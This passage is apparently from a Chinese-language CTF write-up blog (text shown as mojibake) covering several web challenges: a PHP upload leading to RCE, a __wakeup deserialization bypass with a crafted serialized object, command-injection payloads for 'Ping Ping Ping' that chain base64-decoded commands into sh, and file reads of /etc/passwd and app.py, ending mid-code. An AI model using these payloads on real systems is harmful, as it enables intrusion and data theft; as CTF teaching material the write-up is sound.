class="hljs-number">1024</span>)&#123;</span><br><span class="language-php">				<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;</span>;</span><br><span class="language-php">			&#125;</span><br><span class="language-php">			<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">				<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;</span><br><span class="language-php">			&#125;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php">		<span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="language-php">		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;Filename;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="language-php">	<span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();</span><br><span class="language-php">	<span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);</span><br><span class="language-php">	<span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>çœ‹åˆ°äº†evalï¼Œä½†æˆ‘ä¸çŸ¥é“æ€ä¹ˆæ‰èƒ½åˆ©ç”¨åˆ°ä»–ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>		@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>		&#125;<br><br>		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>	&#125;<br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br>	<span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>	<span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™ä¹Ÿè§£é‡Šäº†æˆ‘ä»¬ä¸ºä»€ä¹ˆæ€»æ˜¯txtç»“å°¾äº†ï¼Œæˆ‘ä»¬è¿™æ¬¡æäº¤çš„æ—¶å€™åŠ ä¸Šå‚æ•°name&#x3D;b.php<br><img src="/images/4D4CC0D5BAAE4b81B8FC9B0C66575CFE.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œè¿˜ä»¥ä¸ºæŠŠä¸€å¥è¯æœ¨é©¬å†™åˆ°è¿™ä¸ªé¡µé¢äº†ï¼Œè¯•äº†å¥½ä¹…æ²¡æ³¨å‡ºæ¥<br><img src="/images/9347E699015B42e0A33D4C4B94FA4A42.png" srcset="/img/loading.gif" lazyload><br>ç¡®å®æ˜¯åœ¨è¿™ä¸ªé¡µé¢ä¸Šå•Šã€‚ã€‚ã€‚ã€‚<br>å›æ¥çœ‹æˆ‘ä»¬çš„b.phpå·²ç»åˆ›å»ºäº†<br>æ‰§è¡ŒRCE<br><img src="/images/F077828EDD574fa9BEF5C863D21B60AA.png" srcset="/img/loading.gif" lazyload></p>
<p>çœ‹äº†ä¸‹wpï¼Œè¿™ç§æ–¹æ³•æ˜¯éé¢„æœŸè§£ï¼Œé¢„æœŸè§£æ˜¯pharååºåˆ—åŒ–<br>å¥½æŠŠï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°ä¸å‡ºæ¥<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/soldi_er/article/details/117702168">GXYCTF2019BabysqliV3.0-pharååºåˆ—åŒ–æ­£è§£</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/122930867">pharååºåˆ—åŒ–</a></p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-no-wakeup"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-no-wakeup" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å·²çŸ¥åœ¨ä½¿ç”¨ unserialize() ååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨ __wakeup()å‡½æ•°ï¼Œ</p>
<p>è€Œæœ¬é¢˜çš„å…³é”®å°±æ˜¯å¦‚ä½• ç»•è¿‡ __wakeup()å‡½æ•°ï¼Œå°±æ˜¯ åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸è°ƒç”¨å®ƒ</p>
<p>å½“ åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„ å±æ€§å€¼ ä¸ªæ•° å¤§äº å±æ€§ä¸ªæ•° å°±ä¼šå¯¼è‡´ååºåˆ—åŒ–å¼‚å¸¸ï¼Œä»è€Œç»•è¿‡ __wakeup()</p>
<p>ä»£ç ä¸­çš„__wakeup()æ–¹æ³•å¦‚æœä½¿ç”¨å°±æ˜¯å’Œunserialize()ååºåˆ—åŒ–å‡½æ•°ç»“åˆä½¿ç”¨çš„<br>æ„é€ åºåˆ—åŒ–ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&#x27;wllm&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–è¿”å›çš„å­—ç¬¦ä¸²æ ¼å¼ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">O:<span class="hljs-tag">&lt;<span class="hljs-name">length</span>&gt;</span>:&quot;<span class="hljs-tag">&lt;<span class="hljs-name">class</span> <span class="hljs-attr">name</span>&gt;</span>&quot;:<span class="hljs-tag">&lt;<span class="hljs-name">n</span>&gt;</span>:&#123;<span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">name</span> <span class="hljs-attr">1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">value</span> <span class="hljs-attr">1</span>&gt;</span>...<span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">name</span> <span class="hljs-attr">n</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">value</span> <span class="hljs-attr">n</span>&gt;</span>&#125; <br></code></pre></td></tr></table></figure>
<p>O:è¡¨ç¤ºåºåˆ—åŒ–çš„æ˜¯å¯¹è±¡</p>
<ul>
<li>length:è¡¨ç¤ºåºåˆ—åŒ–çš„ç±»åç§°é•¿åº¦</li>
<li>class nameï¼šè¡¨ç¤ºåºåˆ—åŒ–çš„ç±»çš„åç§°</li>
<li>n:è¡¨ç¤ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„å±æ€§ä¸ªæ•°</li>
<li>field name 1ï¼šå±æ€§å</li>
<li>field value 1ï¼šå±æ€§å€¼<br>æ‰€ä»¥è¦ä¿®æ”¹å±æ€§å€¼nï¼Œæ—¢æŠŠ2æ”¹ä¸º3ä»¥ä¸Šã€‚<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
æœ€å¥½urlç¼–ç ä¸€ä¸‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡wakeupå“©</li>
</ul>
<h2 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h2><p><img src="/images/D83E06DA3B3F4f119814F5F53C8CF867.png" srcset="/img/loading.gif" lazyload><br>å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œç”¨ç®¡é“ç¬¦éš”å¼€ï¼Œç©ºæ ¼ç­‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¢«ç¦ç”¨äº†ï¼Œä½†$æ²¡æœ‰ï¼Œå¯æ›¿ä»£ç©ºæ ¼</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cat$IFS$<span class="language-php"><span class="hljs-number">1</span>index.php</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="language-php">		<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;</span><br><span class="language-php">			<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$match</span>);</span><br><span class="language-php">			<span class="hljs-keyword">print</span>(<span class="hljs-variable">$ip</span>);</span><br><span class="language-php">			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;tac$IFS`ls`<br><span class="hljs-number">127.0.0.1</span>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$<span class="hljs-number">1</span>-d|sh<br><span class="hljs-number">127.0.0.1</span>;a=ag;b=fl;cat$IFS$b$a.php<br>å¦‚æœ<span class="hljs-string">[]</span>æ²¡è¢«ç¦ç”¨ä¹Ÿå¯ä»¥<br><span class="hljs-number">127.0.0.1</span>;a=f;cat$IFS<span class="hljs-string">[e-g]</span>lag<br></code></pre></td></tr></table></figure>

<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h2><p><img src="/images/2192F558557E46a38BA5C25E5C73F1FC.png" srcset="/img/loading.gif" lazyload><br>æœ‰ä¸ªé“¾æ¥æŒ‡å‘baidu<br>é“¾æ¥çš„è¯é¦–å…ˆè€ƒè™‘èƒ½ä¸èƒ½è¯»æ–‡ä»¶ï¼Œå…ˆå˜Ÿå˜Ÿ&#x2F;etc&#x2F;passwd<br><img src="/images/74B542F0387242528E1A6D7C29F57EDA.png" srcset="/img/loading.gif" lazyload><br>è¯•äº†ä¸€ä¸‹flagä¸èƒ½è¯»<br>çœ‹ä¸€çœ‹&#x2F;proc&#x2F;self&#x2F;cmdlineæœ‰ä»€ä¹ˆå†…å®¹<br><img src="/images/A3DAF9A9C09D4362A1E75BDAA52F3DD5.png" srcset="/img/loading.gif" lazyload><br>urlå‚æ•°è¯»ä¸€ä¸‹app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>encoding:utf-<span class="hljs-number">8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span 